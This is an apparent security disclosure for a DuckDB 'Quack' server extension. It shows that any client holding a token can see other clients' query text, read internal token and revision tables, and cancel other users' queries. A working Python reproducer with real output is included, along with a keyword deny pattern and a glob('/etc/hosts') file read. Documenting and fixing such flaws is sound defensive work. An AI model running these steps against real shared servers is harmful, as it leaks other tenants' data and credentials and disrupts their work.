# Quack exposes other clients' queries, server-internal tables and query cancellation to every client

## Summary
Any client with a valid token can list every connection's id and current query text (`quack_active_connections()`), read any table on the instance (datarecord's `revisions`, token tables), and cancel another connection's running query (`quack_cancel`). **verified** A deny-by-default authorization hook closes the first two. It does not close the third.

## Context
- Query text can carry other users' filters and identifiers. **verified** (B's `owner=bob project=42` was visible to A).
- Connection ids are what the authorization hook keys on. Knowing B's id lets A run `quack_cancel('r', '<B id>')`, which killed B's query. **verified** The function is in the [reference](https://duckdb.org/docs/2.0/quack/reference.html) and documents no ownership check. It is a client-side call: with a hook denying any text containing `quack_`, it still succeeded, so the hook never sees it. **verified** I did not test whether an id lets a client impersonate B toward the hook (open question).
- A shared instance leaks other projects' store locations through `revisions` (`datarecord/src/datarecord/store.py:42-49`, `:87`). **verified**
- Docs: the [security page](https://duckdb.org/docs/2.0/quack/security.html) says a server "exposes the full SQL surface of the underlying DuckDB instance, including read and write access to every table the server's session can see". The reference describes `quack_active_connections()` as listing "the client connections of the servers running in this instance". Neither page says anything about isolation between connections. **read**
- Over a LAN address, `quack_active_connections()` was re-verified by the prior agent; the script below uses localhost only.

## Minimal reproducer
Save as `repro.py`, run `datarecord/.venv/bin/python -I repro.py` (port 9945; the server is a subprocess, killed on exit).

```python
import signal, subprocess, sys, threading, time
import duckdb
PORT, TOKEN = 9945, "shared-project-token"

def server():
    signal.alarm(120)  # safety net: the server never outlives the run
    s = duckdb.connect(); s.execute("INSTALL quack; LOAD quack;")
    # stand-ins for server-internal state: datarecord's `revisions`, an auth-hook token table
    s.execute("CREATE TABLE revisions(id VARCHAR, location VARCHAR)")
    s.execute("INSERT INTO revisions VALUES ('r1','s3://manta/project-7/store'),('r2','s3://manta/project-9/store')")
    s.execute("CREATE TABLE quack_tokens(token VARCHAR, project VARCHAR)")
    s.execute("INSERT INTO quack_tokens VALUES ('raw-token-for-project-7','project-7')")
    s.execute(f"CALL quack_serve('quack:localhost:{PORT}', token='{TOKEN}')")
    print("server up", flush=True); time.sleep(120)

def client():
    c = duckdb.connect(); c.execute("LOAD quack")
    c.execute(f"ATTACH 'quack:localhost:{PORT}' AS r (TOKEN '{TOKEN}')"); return c

def remote(c, sql): return c.execute(f"FROM r.query($${sql}$$)").fetchall()

def main():
    srv = subprocess.Popen([sys.executable, "-I", "-u", __file__, "server"], stdout=subprocess.PIPE, text=True)
    try:
        assert srv.stdout.readline().strip() == "server up"
        a, b = client(), client()
        b_id = b.execute("SELECT quack_connection_id('r')").fetchone()[0]
        out = {}
        def run_b():  # B: long query carrying a user-specific filter
            try: out["b"] = remote(b, "SELECT count(*) FROM range(1000000000000) t(i) "
                                      "WHERE i % 7 = 0 AND 'owner=bob project=42' <> ''")
            except Exception as e: out["b"] = "error: " + str(e).splitlines()[0]
        t = threading.Thread(target=run_b); t.start(); time.sleep(2)
        conns = remote(a, "SELECT connection_id, query, state FROM quack_active_connections()")
        revs = remote(a, "SELECT location FROM revisions")
        toks = remote(a, "SELECT token FROM quack_tokens")
        cancel = a.execute(f"SELECT * FROM quack_cancel('r', '{b_id}')").fetchall()
        t.join(15)
        print("B's connection id:", b_id, "\nA sees all connections:"); [print("  ", r) for r in conns]
        print("A reads revisions:", [r[0] for r in revs], "\nA reads quack_tokens:", [r[0] for r in toks])
        print("A quack_cancel(B):", cancel, "\nB's query afterwards:", out.get("b"))
        saw = [r for r in conns if r[0] == b_id and "owner=bob" in (r[1] or "")]
        for what, got in [("A sees B's id and query text", saw), ("A reads revisions", revs),
                          ("A reads token table", toks), ("A cancels B by id", cancel and cancel[0][1])]:
            print(f"{what:30} expected: no   actual: {'YES' if got else 'no'}")
    finally:
        srv.kill()

if __name__ == "__main__":
    server() if sys.argv[1:] == ["server"] else main()
```

Output (real run):
```
B's connection id: 5CEF230D09317DF487E8346EC2604CEE 
A sees all connections:
   ('5CEF230D09317DF487E8346EC2604CEE', "SELECT count(*) FROM range(1000000000000) t(i) WHERE i % 7 = 0 AND 'owner=bob project=42' <> ''", 'active')
   ('CD4FBC8A902977CD3A23C77E40906A16', 'SELECT connection_id, query, state FROM quack_active_connections()', 'active')
A reads revisions: ['s3://manta/project-7/store', 's3://manta/project-9/store'] 
A reads quack_tokens: ['raw-token-for-project-7']
A quack_cancel(B): [('5CEF230D09317DF487E8346EC2604CEE', True)] 
B's query afterwards: error: INTERRUPT Error: Interrupted: query was cancelled
A sees B's id and query text   expected: no   actual: YES
A reads revisions              expected: no   actual: YES
A reads token table            expected: no   actual: YES
A cancels B by id              expected: no   actual: YES
```

## Environment
DuckDB 2.0.0 (quack extension f96420ed46, from repository), Python 3.14.5, macOS (Darwin 25.6.0, arm64).

## Where it belongs
- DuckDB/Quack upstream: should `quack_active_connections()` and `quack_cancel` be scoped to the caller's own connection for remote sessions? A remote client currently has the same introspection rights as the server's owner.
- Manta: the exposure follows from running a shared instance with token auth only.

## Suggested fix
- Upstream: scope introspection and `quack_cancel` to the calling connection for remote sessions, or add a setting that denies them.
- Manta, one instance per project, so `revisions` and tokens only describe that project. Cancel then only reaches the same project's connections.
- Manta, hash-only token storage (`sha256(token)`), so a readable token table leaks nothing usable.
- Manta, hook allowlist. A minimal macro hook (scratch test, 9943) allowed `BEGIN TRANSACTION`/`COMMIT`, the two `ATTACH` discovery queries by `md5(query)`, and otherwise only `SELECT`/`FROM` text not matching `quack_|duckdb_|pragma|query|information_schema|revisions|internal`. Results: `ATTACH` and `SELECT * FROM data` worked; `quack_active_connections()`, `internal.revisions` and a `query('...'||'...')` bypass were denied. **verified** It is a denylist on text, not an allowlist: `glob('/etc/hosts')` still ran, and `quack_cancel` was unaffected. So it narrows exposure and does not make a shared instance safe.
- Hiding `revisions` in a separate attached database or schema does **not** work: both `internal.revisions` and `hidden.revisions` were readable by the client and listed in its catalog. **verified** A hook rule can deny by name (see above), with the limits above.

## Severity note
Today a project has one owner, so all connections of an instance belong to one user and the leak is self-disclosure. Severity rises with shared projects (collaborators see each other's queries and can cancel each other's work) and sharply with one instance serving several projects (cross-project store locations, tokens, queries, and a cancel that crosses tenants).

## Open questions
- Can a client present or reuse another connection's id toward the authorization hook? Untested.
- Does `quack_cancel` have any server-side check I did not hit (e.g. a setting)? None found in the reference.
- Does `quack_cancel` also work when the hook is a Python or extension callback? Only macro hooks were tried.
